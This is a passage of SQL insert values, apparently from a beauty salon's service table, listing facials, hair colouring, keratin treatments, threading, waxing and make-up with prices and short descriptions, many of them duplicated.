(99, '', '', 'Schwarzkopf - Full ', 0, 0, 1, 1199, 1, 0, 2, 29, 14, 'Removes all dirt, pollutants and contaminants from the pores.'),
(112, '', '', 'CHERYL\'S GLOWVIT FACIAL ', 0, 0, 1, 1050, 1, 0, 30, 24, 10, 'Instant skin lightening facial for a radiant and glowing skin.'),
(113, '', '', 'O3+ POWER BRIGHTENING FACIAL', 0, 0, 1, 2000, 1, 0, 30, 24, 10, 'Controls and prevents uneven skin tone and pigmentation, brightening and energizing the skin, reduces the appearance of fine lines and wrinkles.'),
(114, '', '', 'Touchup- Schwarzkopf Absolute Brown', 0, 0, 1, 899, 1, 0, 21, 28, 14, 'Quick fix to cover the roots of grey hair.'),
(115, '', '', 'Global ( Schwarzkopf, Absolute Brown)- Short Length', 0, 0, 1, 3000, 1, 0, 21, 28, 14, 'A colouring technique covering the hair with the same colour from root to tip.'),
(116, '', '', 'Global ( Schwarzkopf, Absolute Brown)- Mid Length', 0, 0, 1, 3250, 1, 0, 21, 28, 14, 'A colouring technique covering the hair with the same colour from root to tip.'),
(117, '', '', 'Global ( Schwarzkopf, Absolute Brown)- Long Length', 0, 0, 1, 3500, 1, 0, 21, 28, 14, 'A colouring technique covering the hair with the same colour from root to tip.'),
(118, '', '', 'Highlights- Schwarzkorpf', 0, 0, 1, 3500, 1, 0, 21, 28, 14, 'A colouring technique to show off the lines of the hair cut, creat depth and an illusion of fullness.'),
(119, '', '', 'Balayage/ Ombre', 0, 0, 1, 3500, 1, 0, 21, 28, 14, 'A colouring technique where hair colour is painted onto the hair to create a graduated, more natural-looking highlight looking and create a shadow.'),
(120, '', '', 'Schwarzkopf - Shoulder', 0, 0, 1, 949, 1, 0, 21, 29, 14, 'Removes all dirt, pollutants and contaminants from the pores.'),
(121, '', '', 'Schwarzkopf -  Mid Back Lenght', 0, 0, 1, 999, 1, 0, 21, 29, 14, 'Removes all dirt, pollutants and contaminants from the pores.'),
(122, '', '', 'Schwarzkopf - Full ', 0, 0, 1, 1199, 1, 0, 21, 29, 14, 'Removes all dirt, pollutants and contaminants from the pores.'),
(123, '', '', 'Keratin- Upto Neck', 0, 0, 1, 3299, 1, 0, 21, 30, 14, ' Keratin is a protective protein, less prone to scratching or tearing than other types of cells your body produces. Keratin can be derived from the feathers, horns, and wool of different animals and used as an ingredient in hair cosmetics.'),
(124, '', '', 'Keratin- Upto Shoulder', 0, 0, 1, 3599, 1, 0, 21, 30, 14, ' Keratin is a protective protein, less prone to scratching or tearing than other types of cells your body produces. Keratin can be derived from the feathers, horns, and wool of different animals and used as an ingredient in hair cosmetics.'),
(125, '', '', 'Keratin-  Long', 0, 0, 1, 3990, 1, 0, 21, 30, 14, ' Keratin is a protective protein, less prone to scratching or tearing than other types of cells your body produces. Keratin can be derived from the feathers, horns, and wool of different animals and used as an ingredient in hair cosmetics.'),
(126, '', '', 'Glatt- Shoulder', 0, 0, 1, 4750, 1, 0, 21, 31, 14, 'A technique used to give a smooth, streamlined and sleek appearence. It also tames down feezy hair.'),
(127, '', '', 'Glatt- Long', 0, 0, 1, 5500, 1, 0, 21, 31, 14, 'A technique used to give a smooth, streamlined and sleek appearence. It also tames down feezy hair.'),
(128, '', '', 'Ironing', 0, 0, 1, 500, 1, 0, 21, 33, 14, ' Its ability to distribute heat equally.'),
(129, '', '', 'Hair Curling', 0, 0, 1, 500, 1, 0, 21, 33, 14, 'Identifying your curl shape and pattern (or patterns) is best determined while your hair is sopping wet'),
(130, '', '', 'Half Arm- Rica / Roll on', 0, 0, 1, 250, 1, 0, 30, 38, 21, 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\\s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.'),
(131, '', '', 'CHERYL\'S GLOWVIT FACIAL ', 0, 0, 1, 1050, 1, 0, 27, 24, 15, 'Instant skin lightening facial for a radiant and glowing skin.'),
(132, '', '', 'O3+ POWER BRIGHTENING FACIAL', 0, 0, 1, 2000, 1, 0, 27, 24, 16, 'Controls and prevents uneven skin tone and pigmentation, brightening and energizing the skin, reduces the appearance of fine lines and wrinkles.'),
(133, '', '', 'Normal Hair Cut', 0, 0, 1, 499, 1, 0, 27, 27, 33, 'A regular haircut, in Western fashion, is a men\'s and boys\' hairstyle that has hair long enough to comb on top, a defined or deconstructed side part, and a short, semi-short, medium, long, or extra long back and sides.'),
(134, '', '', 'O3+ POWER BRIGHTENING FACIAL', 0, 0, 1, 2000, 1, 0, 25, 24, 10, 'Controls and prevents uneven skin tone and pigmentation, brightening and energizing the skin, reduces the appearance of fine lines and wrinkles.'),
(135, '', '', 'Normal Hair Cut', 0, 0, 1, 499, 1, 0, 32, 27, 14, 'A regular haircut, in Western fashion, is a men\\s and boys\\ hairstyle that has hair long enough to comb on top, a defined or deconstructed side part, and a short, semi-short, medium, long, or extra long back and sides.'),
(136, '', '', 'Hair Cut- Fringes ', 0, 0, 1, 250, 1, 0, 32, 27, 14, 'A regular haircut, in Western fashion, is a men\\s and boys\\ hairstyle that has hair long enough to comb on top, a defined or deconstructed side part, and a short, semi-short, medium, long, or extra long back and sides.'),
(137, '', '', 'Touchup- Schwarzkopf Absolute Brown', 0, 0, 1, 899, 1, 0, 32, 28, 14, 'Quick fix to cover the roots of grey hair.'),
(138, '', '', 'Global ( Schwarzkopf, Absolute Brown)- Short Length', 0, 0, 1, 3000, 1, 0, 32, 28, 14, 'A colouring technique covering the hair with the same colour from root to tip.'),
(139, '', '', 'Global ( Schwarzkopf, Absolute Brown)- Mid Length', 0, 0, 1, 3250, 1, 0, 32, 28, 14, 'A colouring technique covering the hair with the same colour from root to tip.'),
(140, '', '', 'Global ( Schwarzkopf, Absolute Brown)- Long Length', 0, 0, 1, 3500, 1, 0, 32, 28, 14, 'A colouring technique covering the hair with the same colour from root to tip.'),
(141, '', '', 'Highlights- Schwarzkorpf', 0, 0, 1, 3500, 1, 0, 32, 28, 14, 'A colouring technique to show off the lines of the hair cut, creat depth and an illusion of fullness.'),
(142, '', '', 'Balayage/ Ombre', 0, 0, 1, 3500, 1, 0, 32, 28, 14, 'A colouring technique where hair colour is painted onto the hair to create a graduated, more natural-looking highlight looking and create a shadow.'),
(143, '', '', 'Schwarzkopf - Shoulder', 0, 0, 1, 949, 1, 0, 32, 29, 14, 'Removes all dirt, pollutants and contaminants from the pores.'),
(144, '', '', 'Schwarzkopf -  Mid Back Lenght', 0, 0, 1, 999, 1, 0, 32, 29, 14, 'Removes all dirt, pollutants and contaminants from the pores.'),
(145, '', '', 'Schwarzkopf - Full ', 0, 0, 1, 1199, 1, 0, 32, 29, 14, 'Removes all dirt, pollutants and contaminants from the pores.'),
(146, '', '', 'Keratin- Upto Neck', 0, 0, 1, 3299, 1, 0, 32, 30, 14, ' Keratin is a protective protein, less prone to scratching or tearing than other types of cells your body produces. Keratin can be derived from the feathers, horns, and wool of different animals and used as an ingredient in hair cosmetics.'),
(147, '', '', 'Keratin- Upto Shoulder', 0, 0, 1, 3599, 1, 0, 32, 30, 14, ' Keratin is a protective protein, less prone to scratching or tearing than other types of cells your body produces. Keratin can be derived from the feathers, horns, and wool of different animals and used as an ingredient in hair cosmetics.'),
(148, '', '', 'Keratin-  Long', 0, 0, 1, 3990, 1, 0, 32, 30, 14, ' Keratin is a protective protein, less prone to scratching or tearing than other types of cells your body produces. Keratin can be derived from the feathers, horns, and wool of different animals and used as an ingredient in hair cosmetics.'),
(149, '', '', 'Glatt- Shoulder', 0, 0, 1, 4750, 1, 0, 32, 31, 14, 'A technique used to give a smooth, streamlined and sleek appearence. It also tames down feezy hair.'),
(150, '', '', 'Glatt- Long', 0, 0, 1, 5500, 1, 0, 32, 31, 14, 'A technique used to give a smooth, streamlined and sleek appearence. It also tames down feezy hair.'),
(151, '', '', 'Ironing', 0, 0, 1, 500, 1, 0, 32, 33, 14, ' Its ability to distribute heat equally.'),
(152, '', '', 'Hair Curling', 0, 0, 1, 500, 1, 0, 32, 33, 14, 'Identifying your curl shape and pattern (or patterns) is best determined while your hair is sopping wet'),
(153, '', '', 'Threading- Chin', 0, 0, 1, 29, 1, 0, 32, 36, 20, ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.'),
(154, '', '', 'Threading- Sidelocks', 0, 0, 1, 49, 1, 0, 32, 36, 20, ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.'),
(155, '', '', 'Threading- Forehead', 0, 0, 1, 59, 1, 0, 32, 36, 20, ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.'),
(156, '', '', 'Threading- Upper lips', 0, 0, 1, 19, 1, 0, 32, 36, 20, ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.'),
(157, '', '', 'Threading- Jawline', 0, 0, 1, 99, 1, 0, 32, 36, 20, ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.'),
(159, '', '', 'Threading- Neck', 0, 0, 1, 149, 1, 0, 32, 36, 20, ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.'),
(160, '', '', 'Threading- Full face', 0, 0, 1, 149, 1, 0, 32, 36, 20, ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.'),
(161, '', '', 'CHERYL\'S GLOWVIT FACIAL ', 0, 0, 1, 1050, 1, 0, 20, 24, 15, 'Instant skin lightening facial for a radiant and glowing skin.'),
(162, '', '', 'O3+ POWER BRIGHTENING FACIAL', 0, 0, 1, 2000, 1, 0, 20, 24, 16, 'Controls and prevents uneven skin tone and pigmentation, brightening and energizing the skin, reduces the appearance of fine lines and wrinkles.'),
(163, '', '', 'Schwarzkopf - Shoulder', 0, 0, 1, 949, 1, 0, 20, 29, 30, 'Removes all dirt, pollutants and contaminants from the pores.'),
(164, '', '', 'Schwarzkopf -  Mid Back Lenght', 0, 0, 1, 999, 1, 0, 20, 29, 31, 'Removes all dirt, pollutants and contaminants from the pores.'),
(165, '', '', 'Schwarzkopf - Full ', 0, 0, 1, 1199, 1, 0, 20, 29, 32, 'Removes all dirt, pollutants and contaminants from the pores.'),
(166, '', '', 'Touchup- Schwarzkopf Absolute Brown', 0, 0, 1, 899, 1, 0, 20, 28, 43, 'Quick fix to cover the roots of grey hair.'),
(167, '', '', 'Global ( Schwarzkopf, Absolute Brown)- Mid Length', 0, 0, 1, 3250, 1, 0, 20, 28, 45, 'A colouring technique covering the hair with the same colour from root to tip.'),
(168, '', '', 'Global ( Schwarzkopf, Absolute Brown)- Mid Length', 0, 0, 1, 3250, 1, 0, 20, 28, 45, 'A colouring technique covering the hair with the same colour from root to tip.'),
(189, '', '', 'CHERYL\'S GLOWVIT FACIAL ', 0, 0, 1, 1050, 1, 0, 34, 24, 10, 'Instant skin lightening facial for a radiant and glowing skin.'),
(190, '', '', 'Threading- Full face', 0, 0, 1, 149, 1, 0, 34, 36, 20, ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.'),
(191, '', '', 'Face Wax- Full face', 0, 0, 1, 399, 1, 0, 34, 37, 20, 'The entire hair follicle is removed when being waxed out and results in a much smoother feel than shaving. Waxing is also a natural exfoliant which helps keep dead skin cells at bay.'),
(192, '', '', 'Full Body - Rica / Roll On', 0, 0, 1, 1600, 1, 0, 34, 38, 21, 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\\s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.'),
(194, '', '', 'Schwarzkopf - Full ', 0, 0, 1, 1199, 1, 0, 30, 29, 14, 'Removes all dirt, pollutants and contaminants from the pores.'),
(195, '', '', 'O3+ POWER BRIGHTENING FACIAL', 0, 0, 1, 2000, 1, 0, 30, 24, 10, 'Controls and prevents uneven skin tone and pigmentation, brightening and energizing the skin, reduces the appearance of fine lines and wrinkles.'),
(196, '', '', 'JANSSEN SKIN FIRMING & WHITENING FACIAL', 0, 0, 1, 2999, 1, 0, 30, 24, 10, 'A luxurious and relaxing anti-aging treatment that fully moisturizes, smoothens fine lines and contours aging skin.  '),
(197, '', '', 'CASMARA- GOJI ANTI -OXIDANT FACIAL', 0, 0, 1, 3999, 1, 0, 30, 24, 10, 'A stimulating anti oxidant facial containing extracts of Goji berries and Quinoa seeds for a younger looking skin.'),
(198, '', '', 'Normal Hair Cut', 0, 0, 1, 499, 1, 0, 30, 27, 14, 'A regular haircut, in Western fashion, is a men\\s and boys\\ hairstyle that has hair long enough to comb on top, a defined or deconstructed side part, and a short, semi-short, medium, long, or extra long back and sides.'),
(199, '', '', 'Hair Cut- Fringes ', 0, 0, 1, 250, 1, 0, 30, 27, 14, 'A regular haircut, in Western fashion, is a men\\s and boys\\ hairstyle that has hair long enough to comb on top, a defined or deconstructed side part, and a short, semi-short, medium, long, or extra long back and sides.'),
(200, '', '', 'Touchup- Schwarzkopf Absolute Brown', 0, 0, 1, 899, 1, 0, 30, 28, 14, 'Quick fix to cover the roots of grey hair.'),
(201, '', '', 'Global ( Schwarzkopf, Absolute Brown)- Short Length', 0, 0, 1, 3000, 1, 0, 30, 28, 14, 'A colouring technique covering the hair with the same colour from root to tip.'),
(202, '', '', 'Global ( Schwarzkopf, Absolute Brown)- Mid Length', 0, 0, 1, 3250, 1, 0, 30, 28, 14, 'A colouring technique covering the hair with the same colour from root to tip.'),
(203, '', '', 'Global ( Schwarzkopf, Absolute Brown)- Long Length', 0, 0, 1, 3500, 1, 0, 30, 28, 14, 'A colouring technique covering the hair with the same colour from root to tip.'),
(204, '', '', 'Highlights- Schwarzkorpf', 0, 0, 1, 3500, 1, 0, 30, 28, 14, 'A colouring technique to show off the lines of the hair cut, creat depth and an illusion of fullness.'),
(205, '', '', 'Balayage/ Ombre', 0, 0, 1, 3500, 1, 0, 30, 28, 14, 'A colouring technique where hair colour is painted onto the hair to create a graduated, more natural-looking highlight looking and create a shadow.'),
(206, '', '', 'Schwarzkopf - Shoulder', 0, 0, 1, 949, 1, 0, 30, 29, 14, 'Removes all dirt, pollutants and contaminants from the pores.'),
(207, '', '', 'Schwarzkopf -  Mid Back Lenght', 0, 0, 1, 999, 1, 0, 30, 29, 14, 'Removes all dirt, pollutants and contaminants from the pores.'),
(208, '', '', 'Schwarzkopf - Full ', 0, 0, 1, 1199, 1, 0, 30, 29, 14, 'Removes all dirt, pollutants and contaminants from the pores.'),
(209, '', '', 'test pro', 0, 0, 1, 4560, 1, 0, 30, 29, 14, 'test pro'),
(210, '', '', 'Keratin- Upto Neck', 0, 0, 1, 3299, 1, 0, 30, 30, 14, ' Keratin is a protective protein, less prone to scratching or tearing than other types of cells your body produces. Keratin can be derived from the feathers, horns, and wool of different animals and used as an ingredient in hair cosmetics.'),
(211, '', '', 'Keratin- Upto Shoulder', 0, 0, 1, 3599, 1, 0, 30, 30, 14, ' Keratin is a protective protein, less prone to scratching or tearing than other types of cells your body produces. Keratin can be derived from the feathers, horns, and wool of different animals and used as an ingredient in hair cosmetics.'),
(212, '', '', 'Keratin-  Long', 0, 0, 1, 3990, 1, 0, 30, 30, 14, ' Keratin is a protective protein, less prone to scratching or tearing than other types of cells your body produces. Keratin can be derived from the feathers, horns, and wool of different animals and used as an ingredient in hair cosmetics.'),
(213, '', '', 'Glatt- Shoulder', 0, 0, 1, 4750, 1, 0, 30, 31, 14, 'A technique used to give a smooth, streamlined and sleek appearence. It also tames down feezy hair.'),
(214, '', '', 'Glatt- Long', 0, 0, 1, 5500, 1, 0, 30, 31, 14, 'A technique used to give a smooth, streamlined and sleek appearence. It also tames down feezy hair.'),
(215, '', '', 'Ironing', 0, 0, 1, 500, 1, 0, 30, 33, 14, ' Its ability to distribute heat equally.'),
(216, '', '', 'Hair Curling', 0, 0, 1, 500, 1, 0, 30, 33, 14, 'Identifying your curl shape and pattern (or patterns) is best determined while your hair is sopping wet'),
(217, '', '', 'Threading- Chin', 0, 0, 1, 29, 1, 0, 24, 36, 55, ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.'),
(218, '', '', 'Threading- Chin', 0, 0, 1, 29, 1, 0, 24, 36, 55, ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.'),
(219, '', '', 'Half Arm- Rica / Roll on', 0, 0, 1, 250, 1, 0, 30, 38, 21, 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\\s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.'),
(220, '', '', 'Full Arm- Rica / Roll On', 0, 0, 1, 320, 1, 0, 30, 38, 21, 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\\s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.'),
(221, '', '', 'Under Arm- Rica / Roll on / Peel Off', 0, 0, 1, 100, 1, 0, 30, 38, 21, 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\\s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.'),
(222, '', '', 'Half Leg- Rica / Roll On', 0, 0, 1, 250, 1, 0, 30, 38, 21, 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\\s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.'),
(223, '', '', 'Full Leg- Rica / Roll On', 0, 0, 1, 450, 1, 0, 30, 38, 21, 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\\s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.'),
(224, '', '', 'Bikini Line - Roll On / Rica / Peel Off', 0, 0, 1, 250, 1, 0, 30, 38, 21, 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\\s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.'),
(225, '', '', 'Bikini - Peel Off', 0, 0, 1, 1000, 1, 0, 30, 38, 21, 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\\s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.'),
(226, '', '', 'Stomach - Rica / Peel Off / Roll On', 0, 0, 1, 320, 1, 0, 30, 38, 21, 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\\s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.'),
(227, '', '', 'Back - Rica / Roll On', 0, 0, 1, 450, 1, 0, 30, 38, 21, 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\\s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.'),
(228, '', '', 'Full Body - Rica / Roll On', 0, 0, 1, 1600, 1, 0, 30, 38, 21, 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\\s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.'),
(229, '', '', 'Under Arm- Rica / Roll on / Peel Off', 0, 0, 1, 100, 1, 0, 30, 38, 21, 'Waxing lasts longer and feels smoother than shaving since the hair is removed at the root. ... Because it\\s an exfoliation process, we remove dead skin cells from the area — which is crucial for healthy skin. Plus, hair oftentimes grows back slower and finer.'),
(230, '', '', 'Bridal Make-Up', 0, 0, 1, 15000, 1, 0, 30, 39, 22, 'Bridal makeup is probably the most important point of the wedding planning for the bride. The bride is the main attraction of the whole wedding ceremony. Every girl’s dream becomes to fulfil on that night. They need to look their best in their bridal attire.'),
(231, '', '', 'Party Make-Up', 0, 0, 1, 5500, 1, 0, 30, 40, 22, 'Every girl and women wants to look her best on any occasion. With the help of any professional makeup artist\\s little touch up will help them to achieve their desire.'),
(233, '', '', 'Threading- Chin', 0, 0, 1, 29, 1, 0, 30, 36, 20, ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.'),
(234, '', '', 'Threading- Sidelocks', 0, 0, 1, 49, 1, 0, 30, 36, 20, ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.'),
(235, '', '', 'Threading- Forehead', 0, 0, 1, 59, 1, 0, 30, 36, 20, ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.'),
(236, '', '', 'Threading- Upper lips', 0, 0, 1, 19, 1, 0, 30, 36, 20, ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.'),
(237, '', '', 'Threading- Jawline', 0, 0, 1, 99, 1, 0, 30, 36, 20, ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.'),
(238, '', '', 'Threading- Neck', 0, 0, 1, 149, 1, 0, 30, 36, 20, ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.'),
(239, '', '', 'Threading- Full face', 0, 0, 1, 149, 1, 0, 30, 36, 20, ' Removes several unwanted hairs in one fell swoop rather than just one at a time. This allows all of them to grow back at the same time.'),
(240, '', '', 'Face Wax- Chin', 0, 0, 1, 99, 1, 0, 30, 37, 20, 'The entire hair follicle is removed when being waxed out and results in a much smoother feel than shaving. Waxing is also a natural exfoliant which helps keep dead skin cells at bay.'),
(241, '', '', 'Face Wax- Sidelocks', 0, 0, 1, 99, 1, 0, 30, 37, 20, 'The entire hair follicle is removed when being waxed out and results in a much smoother feel than shaving. Waxing is also a natural exfoliant which helps keep dead skin cells at bay.'),
(242, '', '', 'Face Wax- Forehead', 0, 0, 1, 99, 1, 0, 30, 37, 20, 'The entire hair follicle is removed when being waxed out and results in a much smoother feel than shaving. Waxing is also a natural exfoliant which helps keep dead skin cells at bay.'),
(243, '', '', 'Face Wax- Upper lips', 0, 0, 1, 69, 1, 0, 30, 37, 20, 'The entire hair follicle is removed when being waxed out and results in a much smoother feel than shaving. Waxing is also a natural exfoliant which helps keep dead skin cells at bay.'),
(244, '', '', 'Face Wax- Jawline', 0, 0, 1, 99, 1, 0, 30, 37, 20, 'The entire hair follicle is removed when being waxed out and results in a much smoother feel than shaving. Waxing is also a natural exfoliant which helps keep dead skin cells at bay.'),
(245, '', '', 'Face Wax- Neck', 0, 0, 1, 199, 1, 0, 30, 37, 20, 'The entire hair follicle is removed when being waxed out and results in a much smoother feel than shaving. Waxing is also a natural exfoliant which helps keep dead skin cells at bay.'),
(246, '', '', 'Face Wax- Full face', 0, 0, 1, 399, 1, 0, 30, 37, 20, 'The entire hair follicle is removed when being waxed out and results in a much smoother feel than shaving. Waxing is also a natural exfoliant which helps keep dead skin cells at bay.'),
(247, '', '', 'Normal Hair Cut', 0, 0, 1, 499, 1, 0, 30, 27, 14, 'A regular haircut, in Western fashion, is a men\\s and boys\\ hairstyle that has hair long enough to comb on top, a defined or deconstructed side part, and a short, semi-short, medium, long, or extra long back and sides.'),
(248, '', '', 'Hair Cut- Fringes ', 0, 0, 1, 250, 1, 0, 30, 27, 14, 'A regular haircut, in Western fashion, is a men\\s and boys\\ hairstyle that has hair long enough to comb on top, a defined or deconstructed side part, and a short, semi-short, medium, long, or extra long back and sides.'),
(249, '', '', 'Touchup- Schwarzkopf Absolute Brown', 0, 0, 1, 899, 1, 0, 30, 28, 14, 'Quick fix to cover the roots of grey hair.'),
(250, '', '', 'Global ( Schwarzkopf, Absolute Brown)- Short Length', 0, 0, 1, 3000, 1, 0, 30, 28, 14, 'A colouring technique covering the hair with the same colour from root to tip.'),
(251, '', '', 'Global ( Schwarzkopf, Absolute Brown)- Mid Length', 0, 0, 1, 3250, 1, 0, 30, 28, 14, 'A colouring technique covering the hair with the same colour from root to tip.'),
(252, '', '', 'Global ( Schwarzkopf, Absolute Brown)- Long Length', 0, 0, 1, 3500, 1, 0, 30, 28, 14, 'A colouring technique covering the hair with the same colour from root to tip.'),
(253, '', '', 'Highlights- Schwarzkorpf', 0, 0, 1, 3500, 1, 0, 30, 28, 14, 'A colouring technique to show off the lines of the hair cut, creat depth and an illusion of fullness.'),
(254, '', '', 'Balayage/ Ombre', 0, 0, 1, 3500, 1, 0, 30, 28, 14, 'A colouring technique where hair colour is painted onto the hair to create a graduated, more natural-looking highlight looking and create a shadow.'),
(255, '', '', 'Schwarzkopf - Shoulder', 0, 0, 1, 949, 1, 0, 30, 29, 14, 'Removes all dirt, pollutants and contaminants from the pores.'),
(256, '', '', 'Schwarzkopf -  Mid Back Lenght', 0, 0, 1, 999, 1, 0, 30, 29, 14, 'Removes all dirt, pollutants and contaminants from the pores.'),
(257, '', '', 'Schwarzkopf - Full ', 0, 0, 1, 1199, 1, 0, 30, 29, 14, 'Removes all dirt, pollutants and contaminants from the pores.'),
(258, '', '', 'Keratin- Upto Neck', 0, 0, 1, 3299, 1, 0, 30, 30, 14, ' Keratin is a protective protein, less prone to scratching or tearing than other types of cells your body produces. Keratin can be derived from the feathers, horns, and wool of different animals and used as an ingredient in hair cosmetics.'),
(259, '', '', 'Keratin- Upto Shoulder', 0, 0, 1, 3599, 1, 0, 30, 30, 14, ' Keratin is a protective protein, less prone to scratching or tearing than other types of cells your body produces. Keratin can be derived from the feathers, horns, and wool of different animals and used as an ingredient in hair cosmetics.'),
(260, '', '', 'Keratin-  Long', 0, 0, 1, 3990, 1, 0, 30, 30, 14, ' Keratin is a protective protein, less prone to scratching or tearing than other types of cells your body produces. Keratin can be derived from the feathers, horns, and wool of different animals and used as an ingredient in hair cosmetics.'),
(261, '', '', 'Keratin- Upto Neck', 0, 0, 1, 3299, 1, 0, 30, 30, 14, ' Keratin is a protective protein, less prone to scratching or tearing than other types of cells your body produces. Keratin can be derived from the feathers, horns, and wool of different animals and used as an ingredient in hair cosmetics.'),
(262, '', '', 'Glatt- Shoulder', 0, 0, 1, 4750, 1, 0, 30, 31, 14, 'A technique used to give a smooth, streamlined and sleek appearence. It also tames down feezy hair.'),
(263, '', '', 'Glatt- Long', 0, 0, 1, 5500, 1, 0, 30, 31, 14, 'A technique used to give a smooth, streamlined and sleek appearence. It also tames down feezy hair.'),
(264, '', '', 'Ironing', 0, 0, 1, 500, 1, 0, 30, 33, 14, ' Its ability to distribute heat equally.'),
(265, '', '', 'Hair Curling', 0, 0, 1, 500, 1, 0, 30, 33, 14, 'Identifying your curl shape and pattern (or patterns) is best determined while your hair is sopping wet'),
(266, '', '', 'CHERYL\'S GLOWVIT FACIAL ', 0, 0, 1, 1050, 1, 0, 30, 24, 10, 'Instant skin lightening facial for a radiant and glowing skin.'),
(267, '', '', 'O3+ POWER BRIGHTENING FACIAL', 0, 0, 1, 2000, 1, 0, 30, 24, 10, 'Controls and prevents uneven skin tone and pigmentation, brightening and energizing the skin, reduces the appearance of fine lines and wrinkles.'),
(268, '', '', 'JANSSEN SKIN FIRMING & WHITENING FACIAL', 0, 0, 1, 2999, 1, 0, 30, 24, 10, 'A luxurious and relaxing anti-aging treatment that fully moisturizes, smoothens fine lines and contours aging skin.  '),
(269, '', '', 'CASMARA- GOJI ANTI -OXIDANT FACIAL', 0, 0, 1, 3999, 1, 0, 30, 24, 10, 'A stimulating anti oxidant facial containing extracts of Goji berries and Quinoa seeds for a younger looking skin.'),
(270, '', '', 'CHERYL\'S GLOWVIT FACIAL ', 0, 0, 1, 1050, 1, 0, 30, 24, 10, 'Instant skin lightening facial for a radiant and glowing skin.'),
(283, '', '', 'Schwarzkopf - Shoulder', 0, 0, 1, 949, 1, 0, 30, 29, 14, 'Removes all dirt, pollutants and contaminants from the pores.'),
(291, '', '', 'Bridal Make-Up', 0, 0, 1, 15000, 1, 0, 30, 39, 22, 'Bridal makeup is probably the most important point of the wedding planning for the bride. The bride is the main attraction of the whole wedding ceremony. Every girl’s dream becomes to fulfil on that night. They need to look their best in their bridal attire.'),
(292, '', '', 'Bridal Make-Up', 0, 0, 1, 15000, 1, 0, 12, 39, 79, 'Bridal makeup is probably the most important point of the wedding planning for the bride. The bride is the main attraction of the whole wedding ceremony. Every girl’s dream becomes to fulfil on that night. They need to look their best in their bridal attire.'),
(293, '', '', 'Party Make-Up', 0, 0, 1, 5500, 1, 0, 30, 40, 22, 'Every girl and women wants to look her best on any occasion. With the help of any professional makeup artist\\s little touch up will help them to achieve their desire.'),
(294, '', '', 'Party Make-Up', 0, 0, 1, 5500, 1, 0, 12, 40, 80, 'Every girl and women wants to look her best on any occasion. With the help of any professional makeup artist\'s little touch up will help them to achieve their desire.'),
(297, '', '', 'CHERYL\'S GLOWVIT FACIAL ', 0, 0, 1, 1050, 1, 0, 29, 24, 10, 'Instant skin lightening facial for a radiant and glowing skin.'),
(298, '', '', 'CHERYL\'S GLOWVIT FACIAL ', 0, 0, 1, 1050, 1, 0, 29, 24, 10, 'Instant skin lightening facial for a radiant and glowing skin.'),
(299, '', '', 'Select Item', 0, 0, 1, 0, 1, 0, 29, 0, 14, ''),
(300, '', '', 'CHERYL\'S GLOWVIT FACIAL ', 0, 0, 1, 1050, 1, 0, 19, 24, 10, 'Instant skin lightening facial for a radiant and glowing skin.'),
(301, '', '', 'CHERYL\'S GLOWVIT FACIAL ', 0, 0, 1, 1050, 1, 0, 29, 24, 10, 'Instant skin lightening facial for a radiant and glowing skin.'),
(302, '', '', 'CHERYL\'S GLOWVIT FACIAL ', 0, 0, 1, 1050, 1, 0, 29, 24, 10, 'Instant skin lightening facial for a radiant and glowing skin.'),
